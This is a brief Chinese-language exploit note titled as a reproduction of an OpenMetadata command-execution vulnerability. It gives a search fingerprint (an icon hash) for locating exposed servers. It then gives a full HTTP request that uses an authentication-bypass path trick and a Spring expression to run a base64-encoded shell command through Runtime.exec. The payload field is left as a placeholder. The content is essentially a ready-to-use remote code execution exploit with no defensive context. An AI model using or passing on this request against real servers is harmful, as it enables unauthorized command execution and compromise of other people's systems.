# OpenMetadata命令执行漏洞复现

OpenMetadata ｜ 命令执行 ｜ —
- **指纹**：`icon_hash="733091897"`
- **请求**：`GET /api/v1;v1%2fusers%2flogin/events/subscriptions/validation/condition/T(java.lang.Runtime).getRuntime().exec(new%20java.lang.String(T(java.util.Base64).getDecoder().decode(%22Base64编码的命令%22))) HTTP`

**Payload**
```
需base64编码
```